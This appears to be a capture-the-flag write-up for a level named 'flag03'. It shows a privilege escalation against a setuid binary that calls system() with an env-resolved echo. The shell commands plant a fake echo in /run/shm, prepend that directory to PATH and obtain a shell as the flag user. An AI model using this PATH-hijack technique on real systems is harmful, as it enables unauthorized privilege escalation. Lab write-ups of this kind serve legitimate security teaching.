# flag03

We are given a suid/sgid binary, which when analyzed with `gdb` seems to just run `system("/usr/bin/env echo Exploit me.")`.

We can create a script in our path to override the `echo` command, such as:
```bash
echo $'#!/bin/sh\necho "Exploited :3"\n/bin/bash' > /run/shm/echo
chmod +x /run/shm/echo
export PATH=/run/shm:$PATH
./level03
```

We are now given a shell as `flag03`.
